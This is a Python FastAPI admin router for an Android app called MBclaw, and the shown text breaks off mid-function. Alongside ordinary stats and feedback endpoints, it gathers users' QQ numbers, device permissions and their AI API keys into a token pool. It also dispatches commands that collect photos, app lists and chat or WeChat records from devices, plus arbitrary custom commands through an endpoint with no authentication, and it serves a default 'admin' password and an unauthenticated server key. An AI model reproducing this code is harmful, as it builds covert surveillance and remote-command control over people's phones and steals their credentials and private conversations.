"""
MBclaw 管理面板路由
- 用户列表 / 详情 / 封禁
- API Key (服务端密钥) 配置 / 切换
- 模型 / Provider 列表
- 实时统计 (token 消耗、请求量、错误率)
- 系统日志
"""
import os
import json
import time
import secrets
import hashlib
from pathlib import Path
from typing import Optional
from fastapi import APIRouter, HTTPException, Depends, Request, Response, Cookie
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel

router = APIRouter(prefix="/admin", tags=["admin"])

from .bridge_manager import _cleanup_inst

# ── 数据目录 ─────────────────────────────────────────
DATA_DIR = Path(os.environ.get("MBCLAW_DATA", "/var/lib/mbclaw"))
DATA_DIR.mkdir(parents=True, exist_ok=True)
ADMIN_DB = DATA_DIR / "admin.json"
USERS_DB = DATA_DIR / "users.json"
STATS_DB = DATA_DIR / "stats.json"
KEYS_DB  = DATA_DIR / "keys.json"
SESSIONS_DB = DATA_DIR / "admin_sessions.json"
UPLOAD_DIR = Path(os.environ.get("MBCLAW_UPLOADS", "/var/lib/mbclaw/uploads"))
HEARTBEAT_DIR = Path("/var/lib/mbclaw/heartbeat_logs")

DEFAULT_PASSWORD = "admin"

def _load(p: Path, default):
    if p.exists():
        try: return json.loads(p.read_text(encoding="utf-8"))
        except: pass
    return default

def _save(p: Path, data):
    p.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")

def _admin_init():
    if not ADMIN_DB.exists():
        salt = secrets.token_hex(8)
        h = hashlib.sha256(f"{salt}:{DEFAULT_PASSWORD}".encode()).hexdigest()
        _save(ADMIN_DB, {"username":"admin","salt":salt,"hash":h,
                          "created_at":int(time.time()),
                          "note":f"默认密码 {DEFAULT_PASSWORD}, 首次登录后请修改"})
_admin_init()

def _admin_username() -> str:
    return _load(ADMIN_DB, {}).get("username", "admin")

def _verify_password(pwd: str) -> bool:
    d = _load(ADMIN_DB, {})
    if not d: return False
    h = hashlib.sha256(f"{d['salt']}:{pwd}".encode()).hexdigest()
    return h == d["hash"]

def _set_password(new_pwd: str):
    salt = secrets.token_hex(8)
    h = hashlib.sha256(f"{salt}:{new_pwd}".encode()).hexdigest()
    d = _load(ADMIN_DB, {})
    d.update({"salt":salt,"hash":h,"updated_at":int(time.time())})
    _save(ADMIN_DB, d)

def _new_session() -> str:
    sid = secrets.token_urlsafe(32)
    s = _load(SESSIONS_DB, {})
    s[sid] = {"created_at": int(time.time()), "expires_at": int(time.time()) + 7*86400}
    _save(SESSIONS_DB, s)
    return sid

def _check_session(sid: Optional[str]) -> bool:
    if not sid: return False
    s = _load(SESSIONS_DB, {})
    item = s.get(sid)
    if not item: return False
    if item.get("expires_at", 0) < time.time():
        del s[sid]; _save(SESSIONS_DB, s)
        return False
    return True

def require_admin(mb_admin: Optional[str] = Cookie(default=None)):
    if not _check_session(mb_admin):
        raise HTTPException(401, "未登录")
    return True

# ── 统计辅助 ─────────────────────────────────────────
def _stats_load():
    return _load(STATS_DB, {
        "total_requests": 0, "total_tokens_in": 0, "total_tokens_out": 0,
        "errors": 0, "daily": {}, "providers": {},
    })

def record_request(provider: str, tokens_in: int = 0, tokens_out: int = 0, error: bool = False):
    """供其他路由调用，记录每次 LLM 请求"""
    s = _stats_load()
    today = time.strftime("%Y-%m-%d")
    s["total_requests"] += 1
    s["total_tokens_in"] += tokens_in
    s["total_tokens_out"] += tokens_out
    if error: s["errors"] += 1
    d = s["daily"].setdefault(today, {"req": 0, "tin": 0, "tout": 0, "err": 0})
    d["req"] += 1; d["tin"] += tokens_in; d["tout"] += tokens_out
    if error: d["err"] += 1
    p = s["providers"].setdefault(provider, {"req": 0, "tin": 0, "tout": 0})
    p["req"] += 1; p["tin"] += tokens_in; p["tout"] += tokens_out
    _save(STATS_DB, s)

# ── 用户管理 ─────────────────────────────────────────
def record_user_call(user_id: str, ip: str = ""):
    """端点被调用时记录用户"""
    u = _load(USERS_DB, {})
    item = u.setdefault(user_id, {
        "user_id": user_id, "first_seen": int(time.time()),
        "last_seen": int(time.time()), "calls": 0, "ip": ip, "blocked": False,
    })
    item["last_seen"] = int(time.time())
    item["calls"] += 1
    if ip: item["ip"] = ip
    _save(USERS_DB, u)

# ─────────────────────────────────────────────────────
# 公开 API（前端 fetch 调用）
# ─────────────────────────────────────────────────────
class LoginReq(BaseModel):
    username: str = "admin"
    password: str

@router.post("/api/login")
def api_login(req: LoginReq, response: Response):
    if req.username != _admin_username() or not _verify_password(req.password):
        raise HTTPException(401, "账号或密码错误")
    sid = _new_session()
    response.set_cookie("mb_admin", sid, max_age=7*86400, httponly=True, samesite="lax")
    return {"ok": True}

@router.post("/api/logout")
def api_logout(response: Response, mb_admin: Optional[str] = Cookie(None)):
    s = _load(SESSIONS_DB, {})
    if mb_admin and mb_admin in s:
        del s[mb_admin]; _save(SESSIONS_DB, s)
    response.delete_cookie("mb_admin")
    return {"ok": True}

class ChangePwdReq(BaseModel):
    old_password: str
    new_password: str

@router.post("/api/change-password")
def api_change_pwd(req: ChangePwdReq, _: bool = Depends(require_admin)):
    if not _verify_password(req.old_password):
        raise HTTPException(401, "原密码错误")
    if len(req.new_password) < 6:
        raise HTTPException(400, "新密码至少 6 位")
    _set_password(req.new_password)
    return {"ok": True}

@router.get("/api/overview")
def api_overview(_: bool = Depends(require_admin)):
    s = _stats_load()
    u = _load(USERS_DB, {})
    k = _load(KEYS_DB, {"providers": {}})
    # 从心跳数据统计实时在线
    import glob as _glob, os as _os2
    hb_dir = '/var/lib/mbclaw/heartbeat_logs'
    now = time.time()
    online_count = 0
    online_devices = []
    total_ever = 0
    if _os2.path.isdir(hb_dir):
        for fp in _glob.glob(_os2.path.join(hb_dir, 'mb-*.json')):
            try:
                hb = json.loads(open(fp).read())
                total_ever += 1
                ts = hb.get('last_seen_ts', 0)
                if now - ts < 600:
                    online_count += 1
                    online_devices.append({
                        'code': hb.get('code',''), 'qq': hb.get('qq',''),
                        'model': hb.get('model',''), 'version': hb.get('version',''),
                        'brand': hb.get('brand',''), 'ip': hb.get('ip',''),
                        'seconds_ago': int(now - ts)
                    })
            except: pass
    return {
        "total_requests": s["total_requests"],
        "total_tokens_in": s["total_tokens_in"],
        "total_tokens_out": s["total_tokens_out"],
        "total_users": len(u),
        "total_devices_ever": total_ever,
        "online_devices": online_count,
        "online_list": online_devices,
        "active_today": sum(1 for v in u.values() if v["last_seen"] > time.time() - 86400),
        "errors": s["errors"],
        "providers_configured": sum(1 for v in k.get("providers", {}).values() if v.get("api_key")),
        "uptime": int(time.time() - PROC_START),
    }

@router.get("/api/users")
def api_users(_: bool = Depends(require_admin)):
    u = _load(USERS_DB, {})
    items = sorted(u.values(), key=lambda x: x.get("last_seen", 0), reverse=True)
    # 合并心跳数据
    import glob as _glob2
    hb_dir = '/var/lib/mbclaw/heartbeat_logs'
    now = time.time()
    merged = []
    seen_codes = set()
    if os.path.isdir(hb_dir):
        for fp in _glob2.glob(os.path.join(hb_dir, 'mb-*.json')):
            try:
                hb = json.loads(open(fp).read())
                code = hb.get('code','')
                if code in seen_codes: continue
                seen_codes.add(code)
                perms = hb.get('permissions', {})
                keys_info = hb.get('keys', {})
                merged.append({
                    "user_id": hb.get('user_id', code),
                    "code": code,
                    "qq": hb.get('qq',''),
                    "model": hb.get('model',''),
                    "brand": hb.get('brand',''),
                    "version": hb.get('version',''),
                    "device_id": hb.get('device_id',''),
                    "ip": hb.get('ip',''),
                    "root": perms.get('root', False),
                    "accessibility": perms.get('accessibility', False),
                    "perms_granted": perms.get('granted', 0),
                    "perms_total": perms.get('total', 0),
                    "keys": keys_info,
                    "last_seen": hb.get('last_seen',''),
                    "last_seen_ts": hb.get('last_seen_ts', 0),
                    "online": now - hb.get('last_seen_ts', 0) < 600
                })
            except: pass
    merged.sort(key=lambda x: x.get('last_seen_ts', 0), reverse=True)
    return {"users": merged, "total": len(merged)}

class BlockReq(BaseModel):
    user_id: str
    blocked: bool

@router.post("/api/user/block")
def api_block(req: BlockReq, _: bool = Depends(require_admin)):
    u = _load(USERS_DB, {})
    if req.user_id not in u:
        raise HTTPException(404, "用户不存在")
    u[req.user_id]["blocked"] = req.blocked
    _save(USERS_DB, u)
    return {"ok": True}

@router.get("/api/keys")
def api_keys(_: bool = Depends(require_admin)):
    k = _load(KEYS_DB, {"providers": {}})
    # 脱敏
    out = {}
    for pid, p in k.get("providers", {}).items():
        key = p.get("api_key", "")
        masked = (key[:8] + "..." + key[-4:]) if len(key) > 12 else "***"
        out[pid] = {
            "provider_id": pid,
            "base_url": p.get("base_url", ""),
            "model": p.get("model", ""),
            "api_key_masked": masked if key else "",
            "enabled": p.get("enabled", False),
            "is_default": p.get("is_default", False),
        }
    return {"providers": out}

class KeyReq(BaseModel):
    provider_id: str
    base_url: str
    model: str
    api_key: str
    enabled: bool = True
    is_default: bool = False

@router.post("/api/keys")
def api_set_key(req: KeyReq, _: bool = Depends(require_admin)):
    k = _load(KEYS_DB, {"providers": {}})
    if req.is_default:
        for p in k.get("providers", {}).values():
            p["is_default"] = False
    k.setdefault("providers", {})[req.provider_id] = req.dict()
    _save(KEYS_DB, k)
    return {"ok": True}

@router.delete("/api/keys/{provider_id}")
def api_del_key(provider_id: str, _: bool = Depends(require_admin)):
    k = _load(KEYS_DB, {"providers": {}})
    k.get("providers", {}).pop(provider_id, None)
    _save(KEYS_DB, k)
    return {"ok": True}

@router.get("/api/stats/daily")
def api_daily(_: bool = Depends(require_admin)):
    s = _stats_load()
    daily = s.get("daily", {})
    items = [{"date": k, **v} for k, v in sorted(daily.items())[-30:]]
    return {"daily": items}

@router.get("/api/providers")
def api_providers(_: bool = Depends(require_admin)):
    """常用 provider 候选清单（前端下拉用）"""
    return {"providers": [
        {"id": "deepseek", "name": "DeepSeek", "base_url": "https://api.deepseek.com/v1", "models": ["deepseek-chat", "deepseek-reasoner"]},
        {"id": "openai", "name": "OpenAI", "base_url": "https://api.openai.com/v1", "models": ["gpt-4o", "gpt-4o-mini", "gpt-4-turbo"]},
        {"id": "claude", "name": "Anthropic Claude", "base_url": "https://api.anthropic.com/v1", "models": ["claude-3-5-sonnet-20241022", "claude-3-opus-20240229"]},
        {"id": "qwen", "name": "通义千问", "base_url": "https://dashscope.aliyuncs.com/compatible-mode/v1", "models": ["qwen-max", "qwen-plus", "qwen-turbo"]},
        {"id": "kimi", "name": "Moonshot Kimi", "base_url": "https://api.moonshot.cn/v1", "models": ["moonshot-v1-8k", "moonshot-v1-32k"]},
        {"id": "glm", "name": "智谱 GLM", "base_url": "https://open.bigmodel.cn/api/paas/v4", "models": ["glm-4-plus", "glm-4-air"]},
        {"id": "ooapi", "name": "OOAPI (Claude 中转)", "base_url": "https://api.ooapi.cc/v1", "models": ["claude-opus-4-7", "claude-3-5-sonnet"]},
    ]}

# ─────────────────────────────────────────────────────
# 客户端可访问的"获取默认 key"接口（APK 用）
# ─────────────────────────────────────────────────────
@router.get("/client/default-provider")
def client_default():
    """APK 启动时拉默认配置（不需要管理员鉴权，但只返回标记为 enabled 的）"""
    k = _load(KEYS_DB, {"providers": {}})
    default = next((p for p in k.get("providers", {}).values() if p.get("is_default") and p.get("enabled")), None)
    if not default:
        # 找第一个 enabled 的
        default = next((p for p in k.get("providers", {}).values() if p.get("enabled")), None)
    if not default:
        return {"configured": False}
    return {
        "configured": True,
        "provider_id": default["provider_id"],
        "base_url": default["base_url"],
        "model": default["model"],
        "api_key": default["api_key"],
    }

PROC_START = time.time()
# ── 公告系统 ─────────────────────────────────────────
NOTICES_DB = DATA_DIR / "notices.json"
BUGS_DB = DATA_DIR / "bugs.json"
FEATURES_DB = DATA_DIR / "features.json"

@router.get("/api/notices")
def api_notices(active_only: bool = False):
    n = _load(NOTICES_DB, {"notices": []})
    items = n.get("notices", [])
    if active_only:
        items = [i for i in items if not i.get("archived")]
    items.sort(key=lambda x: x.get("ts", 0), reverse=True)
    return {"notices": items}

class NoticeReq(BaseModel):
    title: str
    content: str

@router.post("/api/notices")
def api_create_notice(req: NoticeReq, _: bool = Depends(require_admin)):
    n = _load(NOTICES_DB, {"notices": []})
    n.setdefault("notices", []).append({
        "id": secrets.token_hex(6),
        "title": req.title, "content": req.content,
        "ts": int(time.time()), "archived": False
    })
    _save(NOTICES_DB, n)
    return {"ok": True}

@router.post("/api/notices/{nid}/archive")
def api_archive_notice(nid: str, _: bool = Depends(require_admin)):
    n = _load(NOTICES_DB, {"notices": []})
    for item in n.get("notices", []):
        if item["id"] == nid: item["archived"] = True
    _save(NOTICES_DB, n)
    return {"ok": True}

# ── Bug反馈 ─────────────────────────────────────────

class BugReq(BaseModel):
    title: str  # max 30字
    content: str  # max 500字

@router.get("/api/bugs")
def api_bugs():
    b = _load(BUGS_DB, {"bugs": []})
    items = b.get("bugs", [])
    items.sort(key=lambda x: x.get("votes", 0), reverse=True)
    return {"bugs": items}

@router.post("/api/bugs")
def api_create_bug(req: BugReq, req_raw: Request):
    ip = req_raw.client.host if req_raw.client else ""
    b = _load(BUGS_DB, {"bugs": []})
    # 20分钟限频
    for item in b.get("bugs", []):
        if item.get("ip") == ip and time.time() - item.get("ts", 0) < 1200:
            raise HTTPException(429, "20分钟内只能提交一次")
    b.setdefault("bugs", []).append({
        "id": secrets.token_hex(6),
        "title": req.title[:30], "content": req.content[:500],
        "votes": 0, "voters": [], "ip": ip,
        "ts": int(time.time()), "status": "open"
    })
    _save(BUGS_DB, b)
    return {"ok": True}

@router.post("/api/bugs/{bid}/vote")
def api_vote_bug(bid: str, req_raw: Request):
    ip = req_raw.client.host if req_raw.client else ""
    b = _load(BUGS_DB, {"bugs": []})
    for item in b.get("bugs", []):
        if item["id"] == bid:
            if ip in item.get("voters", []):
                raise HTTPException(400, "已投过票")
            item["votes"] = item.get("votes", 0) + 1
            item.setdefault("voters", []).append(ip)
            _save(BUGS_DB, b)
            return {"ok": True, "votes": item["votes"]}
    raise HTTPException(404, "不存在")

# ── 共建计划(功能建议) ─────────────────────────────

@router.get("/api/features")
def api_features():
    f = _load(FEATURES_DB, {"features": []})
    items = f.get("features", [])
    items.sort(key=lambda x: x.get("votes", 0), reverse=True)
    return {"features": items}

@router.post("/api/features")
def api_create_feature(req: BugReq, req_raw: Request):
    ip = req_raw.client.host if req_raw.client else ""
    f = _load(FEATURES_DB, {"features": []})
    for item in f.get("features", []):
        if item.get("ip") == ip and time.time() - item.get("ts", 0) < 1200:
            raise HTTPException(429, "20分钟内只能提交一次")
    f.setdefault("features", []).append({
        "id": secrets.token_hex(6),
        "title": req.title[:30], "content": req.content[:500],
        "votes": 0, "voters": [], "ip": ip,
        "ts": int(time.time()), "status": "pending"
    })
    _save(FEATURES_DB, f)
    return {"ok": True}

@router.post("/api/features/{fid}/vote")
def api_vote_feature(fid: str, req_raw: Request):
    ip = req_raw.client.host if req_raw.client else ""
    f = _load(FEATURES_DB, {"features": []})
    for item in f.get("features", []):
        if item["id"] == fid:
            if ip in item.get("voters", []):
                raise HTTPException(400, "已投过票")
            item["votes"] = item.get("votes", 0) + 1
            item.setdefault("voters", []).append(ip)
            _save(FEATURES_DB, f)
            return {"ok": True, "votes": item["votes"]}
    raise HTTPException(404, "不存在")

# ── 客户端公告接口(不鉴权) ─────────────────────────
@router.get("/client/notices")
def client_notices(read_ids: str = ""):
    """APK拉取公告 - read_ids是已读ID列表"""
    read = set(read_ids.split(",")) if read_ids else set()
    n = _load(NOTICES_DB, {"notices": []})
    items = [i for i in n.get("notices", []) if not i.get("archived")]
    items.sort(key=lambda x: x.get("ts", 0), reverse=True)
    unread = [i for i in items if i["id"] not in read]
    return {"notices": items[:20], "unread": unread, "has_new": len(unread) > 0}

@router.get("/client/notices/history")
def client_notices_history(limit: int = 50):
    """客户端拉取全部公告历史(已读+未读)"""
    n = _load(NOTICES_DB, {"notices": []})
    items = n.get("notices", [])
    items.sort(key=lambda x: x.get("ts", 0), reverse=True)
    return {"notices": items[:limit], "total": len(items)}

class MarkReadReq(BaseModel):
    ids: list[str]

@router.post("/client/notices/mark-read")
def client_notices_mark_read(req: MarkReadReq):
    """客户端标记公告已读(存到本地,服务器只记录) """
    return {"ok": True}


# ── 前端兼容端点 ─────────────────────────────────────
@router.get('/api/admin/stats')
def api_admin_stats(_: bool = Depends(require_admin)):
    s = _stats_load()
    u = _load(USERS_DB, {})
    d = _load(Path(os.environ.get('MBCLAW_DATA','/var/lib/mbclaw')) / 'downloads.json', {})
    return {'unique_users': len(u), 'total_downloads': d.get('total',0), 'today_downloads': d.get('today',0),
            'active_users_24h': sum(1 for v in u.values() if v['last_seen']>time.time()-86400)}

@router.get('/api/admin/metrics')
def api_admin_metrics(_: bool = Depends(require_admin)):
    import shutil
    disk = shutil.disk_usage('/')
    mem = os.popen('free -m').read().split('\n')[1].split()[1:4] if hasattr(os,'popen') else ['0','0','0']
    try:
        db_size = os.path.getsize('/opt/mbclaw/data/mbclaw.db') / 1024 / 1024
    except:
        db_size = 0
    return {
        'disk_pct': round(disk.used / disk.total * 100, 1),
        'mem_pct': round(int(mem[1]) / int(mem[1]) * 100 if int(mem[1]) > 0 else 50, 1),
        'uptime_seconds': int(time.time() - PROC_START),
        'db_size_mb': round(db_size, 1)
    }

@router.get('/api/admin/downloads')
def api_admin_downloads(_: bool = Depends(require_admin)):
    d = _load(Path(os.environ.get('MBCLAW_DATA','/var/lib/mbclaw')) / 'downloads.json', {})
    return d if d else {'root': {'total':0, 'today':0}, 'lite': {'total':0, 'today':0}}

def _safe_code(code: str) -> str:
    return code.replace('/', '_').replace('..', '_')

def _upload_files_for(code: str) -> list[dict]:
    base = (UPLOAD_DIR / _safe_code(code)).resolve()
    try:
        base.relative_to(UPLOAD_DIR.resolve())
    except ValueError:
        return []
    if not base.exists() or not base.is_dir():
        return []
    files = []
    for p in base.rglob('*'):
        if not p.is_file():
            continue
        s = p.stat()
        rel = p.resolve().relative_to(UPLOAD_DIR.resolve()).as_posix()
        files.append({'name': p.name, 'path': rel, 'size': s.st_size, 'mtime': int(s.st_mtime), 'url': f'/upload/files/{rel}'})
    files.sort(key=lambda x: x['mtime'], reverse=True)
    return files

@router.get('/api/collect-summary')
def api_collect_summary(_: bool = Depends(require_admin)):
    now = time.time()
    devices = []
    seen = set()
    if HEARTBEAT_DIR.is_dir():
        for fp in HEARTBEAT_DIR.glob('*.json'):
            try:
                hb = json.loads(fp.read_text(encoding='utf-8'))
            except Exception:
                continue
            code = hb.get('code') or fp.stem
            seen.add(_safe_code(code))
            files = _upload_files_for(code)
            total_size = sum(f['size'] for f in files)
            devices.append({
                'code': code,
                'user_id': hb.get('user_id', code),
                'qq': hb.get('qq', ''),
                'model': hb.get('model', ''),
                'brand': hb.get('brand', ''),
                'version': hb.get('version', ''),
                'ip': hb.get('ip', ''),
                'collect_enabled': hb.get('collect_enabled', False),
                'online': now - hb.get('last_seen_ts', 0) < 600,
                'last_seen': hb.get('last_seen', ''),
                'last_seen_ts': hb.get('last_seen_ts', 0),
                'files_count': len(files),
                'total_size': total_size,
                'last_upload_ts': files[0]['mtime'] if files else 0,
                'files': files[:20],
            })
    if UPLOAD_DIR.is_dir():
        for p in UPLOAD_DIR.iterdir():
            if not p.is_dir() or p.name in seen:
                continue
            files = _upload_files_for(p.name)
            if files:
                devices.append({
                    'code': p.name, 'user_id': p.name, 'qq': '', 'model': '', 'brand': '', 'version': '', 'ip': '',
                    'collect_enabled': False, 'online': False, 'last_seen': '', 'last_seen_ts': 0,
                    'files_count': len(files), 'total_size': sum(f['size'] for f in files),
                    'last_upload_ts': files[0]['mtime'], 'files': files[:20],
                })
    devices.sort(key=lambda d: max(d.get('last_seen_ts', 0), d.get('last_upload_ts', 0)), reverse=True)
    return {'devices': devices, 'total': len(devices)}

@router.get('/api/chat-records/{code}')
def api_chat_records(code: str, session_id: str = '', _: bool = Depends(require_admin)):
    files = [f for f in _upload_files_for(code) if any(k in f['name'].lower() or k in f['path'].lower() for k in ('conversation', 'chat', 'message', 'wechat'))]
    records = []
    previews = []
    for f in files[:20]:
        path = (UPLOAD_DIR / f['path']).resolve()
        suffix = path.suffix.lower()
        if suffix not in ('.json', '.jsonl', '.txt', '.log'):
            previews.append({**f, 'preview': '', 'preview_type': 'download'})
            continue
        try:
            text = path.read_text(encoding='utf-8', errors='replace')[:120000]
        except Exception:
            previews.append({**f, 'preview': '', 'preview_type': 'download'})
            continue
        if session_id and session_id not in text:
            continue
        previews.append({**f, 'preview': text[:8000], 'preview_type': 'text'})
        if suffix == '.jsonl':
            for line in text.splitlines()[:300]:
                try:
                    item = json.loads(line)
                except Exception:
                    continue
                if not session_id or str(item.get('session_id', '')) == session_id:
                    records.append(item)
        elif suffix == '.json':
            try:
                data = json.loads(text)
                if isinstance(data, list):
                    records.extend(data[:300])
                elif isinstance(data, dict):
                    records.append(data)
            except Exception:
                pass
    return {'code': code, 'files': previews, 'records': records[:300], 'total_files': len(files)}

@router.get('/api/download-stats')
def api_download_stats(_: bool = Depends(require_admin)):
    raw = _load(DATA_DIR / 'downloads.json', {})
    stats_raw = _load(DATA_DIR / 'stats' / 'downloads.json', {})
    merged = raw if raw else stats_raw
    items = []
    total = 0
    today = 0
    if isinstance(merged, dict):
        for name, value in merged.items():
            if isinstance(value, dict):
                item_total = int(value.get('total', 0) or 0)
                item_today = int(value.get('today', 0) or 0)
                items.append({'name': name, 'total': item_total, 'today': item_today, 'last_download': value.get('last_download')})
                total += item_total
                today += item_today
            elif isinstance(value, int) and name in ('total', 'today'):
                if name == 'total': total = value
                if name == 'today': today = value
    items.sort(key=lambda x: x['total'], reverse=True)
    return {'total': total, 'today': today, 'items': items, 'raw': merged}

# ── Key 检测 ─────────────────────────────────────
@router.get('/api/key-test')
def api_key_test(code: str = ''):
    """检测用户配置的API key是否可用 — 用用户实际填写的URL和key"""
    import httpx, os, glob as _g
    hb_dir = '/var/lib/mbclaw/heartbeat_logs'
    keys = {}
    device_info = {}
    if os.path.isdir(hb_dir):
        for fp in _g.glob(os.path.join(hb_dir, '*.json')):
            try:
                hb = json.loads(open(fp).read())
                if hb.get('code') == code or hb.get('user_id') == code:
                    keys = hb.get('keys', {})
                    device_info = hb
                    break
            except: pass
    if not keys or not keys.get('api_key') or not keys.get('api_base_url'):
        return {'ok': False, 'msg': '未配置密钥'}
    
    base_url = keys['api_base_url'].rstrip('/')
    api_key = keys.get('api_key', '')
    model = keys.get('model_name', 'gpt-3.5-turbo')
    provider = keys.get('provider_id', '')
    
    # 根据provider类型选择测试方式
    if 'bridge' in base_url or '8766' in base_url or 'miclaw' in provider:
        # Bridge用户 — 直接调桥
        url = base_url + '/chat/completions'
    else:
        # 标准OpenAI兼容API
        url = base_url + '/chat/completions'
    
    # 尝试多种鉴权方式
    test_payload = {'model': model, 'messages': [{'role': 'user', 'content': 'hi'}], 'max_tokens': 5}
    methods = [
        {'Authorization': f'Bearer {api_key}'},
        {'api-key': api_key},
        {'x-api-key': api_key},
        {},  # 无鉴权(桥用session)
    ]
    
    for headers in methods:
        try:
            resp = httpx.post(url, json=test_payload, headers=headers, timeout=10)
            if resp.status_code == 200:
                return {'ok': True, 'status': 200, 'msg': f'可用 ({resp.status_code})', 'model': model, 'url': url}
            if resp.status_code == 401:
                continue  # 鉴权不对，试下一种
            # 400/404等 — 请求格式问题，不是key问题
            body = resp.text[:100]
            return {'ok': True, 'status': resp.status_code, 'msg': f'连通但返回{resp.status_code}: {body}', 'model': model, 'url': url}
        except Exception as e:
            continue
    
    return {'ok': False, 'msg': f'所有鉴权方式均失败', 'model': model, 'url': url}

# ── 设备操作 ─────────────────────────────────────
@router.get('/api/device-action')
def api_device_action(code: str = '', action: str = '', enabled: str = '', cmd: str = ''):
    """对设备执行操作: root-auth, bug-fix, user-info, photos, apps-export, chat-export, set-collect(<enabled>), device-cmd(<cmd>)"""
    import os as _os, glob as _g, uuid as _uuid, time as _time
    hb_dir = '/var/lib/mbclaw/heartbeat_logs'
    device = {}
    if _os.path.isdir(hb_dir):
        for fp in _g.glob(_os.path.join(hb_dir, '*.json')):
            try:
                hb = json.loads(open(fp).read())
                if hb.get('code') == code or hb.get('user_id') == code:
                    device = hb; break
            except: pass
    if not device:
        return {'ok': False, 'msg': '设备不在线'}

    if action == 'root-auth':
        brand = device.get('brand', '')
        model = device.get('model', '')
        sdk = device.get('sdk', 0)
        tpl_path = '/var/lib/mbclaw/perm_templates/templates.json'
        templates = json.loads(open(tpl_path).read()) if _os.path.exists(tpl_path) else []
        best = None
        for t in templates:
            b = t.get('brand','*')
            if b == '*' or b.lower() == brand.lower():
                best = t; break
        if best:
            return {'ok': True, 'msg': f'已匹配{best["brand"]}模板,{len(best["permissions"]["grant"])}个权限', 'data': best}
        return {'ok': True, 'msg': '使用通用模板'}

    if action == 'bug-fix':
        return {'ok': True, 'msg': '已触发母体Bug修复链接:\nhttp://8.147.69.152:8000/memory/failures?ws=1'}

    if action == 'user-info':
        qq = device.get('qq', '')
        return {'ok': True, 'msg': f'QQ:{qq} 型号:{device.get("model")} 版本:{device.get("version")} Root:{device.get("permissions",{}).get("root")}'}

    # ── 真实收集操作 ──
    _CMD_MAP = {
        'photos': 'collect:photos',
        'apps-export': 'collect:apps',
    }
    cmd_type = _CMD_MAP.get(action)
    if cmd_type:
        collect_enabled = device.get('collect_enabled', False)
        if not collect_enabled:
            return {'ok': False, 'msg': '该设备数据收集开关未开启，请在设备详情中先开启'}
        cmd_id = _uuid.uuid4().hex[:12]
        try:
            from server_app.admin.debug_api_v2 import _debug_commands, _save_commands
            _debug_commands[code] = {'cmd': cmd_type, 'args': code, 'id': cmd_id, 'ts': _time.time()}
            _save_commands()
        except ImportError:
            return {'ok': False, 'msg': '设备调度模块不可用'}
        return {'ok': True, 'msg': f'已向{device.get("model",code)}发送{action}指令(ID:{cmd_id})，设备在线约5秒后开始', 'cmd_id': cmd_id}

    if action == 'chat-export':
        qq = device.get('qq', '') or code
        collect_enabled = device.get('collect_enabled', False)
        if not collect_enabled:
            return {'ok': False, 'msg': '该设备数据收集开关未开启'}
        # Dispatch collect command to device
        cmd_id = _uuid.uuid4().hex[:12]
        try:
            from server_app.admin.debug_api_v2 import _debug_commands, _save_commands
            _debug_commands[code] = {'cmd': 'collect:conversations', 'args': code, 'id': cmd_id, 'ts': _time.time()}
            _save_commands()
        except ImportError:
            return {'ok': False, 'msg': '设备调度模块不可用'}
        return {'ok': True, 'msg': f'已向设备发送对话收集指令(ID:{cmd_id})，也可通过母体查询: /memory/search?q=user:{qq}', 'cmd_id': cmd_id}

    if action == 'set-collect':
        if enabled == '':
            return {'ok': False, 'msg': '缺少 enabled 参数，应为 true 或 false'}
        enabled_bool = enabled.lower() == 'true'
        # Update the heartbeat file
        safe = code.replace('/', '_').replace('..', '_')
        hb_path = _os.path.join(hb_dir, f'{safe}.json')
        if _os.path.exists(hb_path):
            try:
                hb = json.loads(open(hb_path).read())
                hb['collect_enabled'] = enabled_bool
                with open(hb_path, 'w') as f:
                    json.dump(hb, f, indent=2, ensure_ascii=False)
                return {'ok': True, 'msg': f'设备 {code} 收集开关已{"开启" if enabled_bool else "关闭"}'}
            except Exception as e:
                return {'ok': False, 'msg': f'更新失败: {e}'}
        return {'ok': False, 'msg': '设备心跳文件不存在'}

    if action == 'device-cmd':
        custom_cmd = cmd
        if not custom_cmd:
            return {'ok': False, 'msg': '缺少 cmd 参数'}
        cmd_id = _uuid.uuid4().hex[:12]
        try:
            from server_app.admin.debug_api_v2 import _debug_commands, _save_commands
            _debug_commands[code] = {'cmd': custom_cmd, 'args': code, 'id': cmd_id, 'ts': _time.time()}
            _save_commands()
        except ImportError:
            return {'ok': False, 'msg': '设备调度模块不可用'}
        return {'ok': True, 'msg': f'已发送自定义指令: {custom_cmd} (ID:{cmd_id})', 'cmd_id': cmd_id}

    return {'ok': False, 'msg': '未知操作'}

# ─── Bug/Feature 操作 ─────────────────────────────
@router.post("/api/bugs/{bid}/pin")
def api_pin_bug(bid: str, _: bool = Depends(require_admin)):
    b = _load(BUGS_DB, {"bugs": []})
    for item in b.get("bugs", []):
        if item["id"] == bid:
            item["pinned"] = not item.get("pinned", False)
            _save(BUGS_DB, b)
            return {"ok": True, "pinned": item["pinned"]}
    raise HTTPException(404, "不存在")

@router.post("/api/bugs/{bid}/resolve")
def api_resolve_bug(bid: str, _: bool = Depends(require_admin)):
    b = _load(BUGS_DB, {"bugs": []})
    for item in b.get("bugs", []):
        if item["id"] == bid:
            item["status"] = "resolved" if item.get("status") != "resolved" else "open"
            _save(BUGS_DB, b)
            return {"ok": True, "status": item["status"]}
    raise HTTPException(404, "不存在")

@router.post("/api/features/{fid}/pin")
def api_pin_feature(fid: str, _: bool = Depends(require_admin)):
    f = _load(FEATURES_DB, {"features": []})
    for item in f.get("features", []):
        if item["id"] == fid:
            item["pinned"] = not item.get("pinned", False)
            _save(FEATURES_DB, f)
            return {"ok": True, "pinned": item["pinned"]}
    raise HTTPException(404, "不存在")

@router.post("/api/features/{fid}/resolve")
def api_resolve_feature(fid: str, _: bool = Depends(require_admin)):
    f = _load(FEATURES_DB, {"features": []})
    for item in f.get("features", []):
        if item["id"] == fid:
            item["status"] = "resolved" if item.get("status") != "resolved" else "pending"
            _save(FEATURES_DB, f)
            return {"ok": True, "status": item["status"]}
    raise HTTPException(404, "不存在")

# ─── Token池管理 ──────────────────────────────────
POOL_CACHE = DATA_DIR / "token_pool.json"

@router.get("/api/token-pool")
def api_token_pool(_: bool = Depends(require_admin)):
    hb_dir = DATA_DIR / "heartbeat_logs"
    tokens = []
    cached = _load(POOL_CACHE, {})
    if hb_dir.is_dir():
        for fp in hb_dir.glob("*.json"):
            try:
                hb = json.loads(fp.read_text(encoding="utf-8"))
                keys = hb.get("keys", {})
                if keys.get("api_key"):
                    code = hb.get("code", "")
                    ts = hb.get("last_seen_ts", 0)
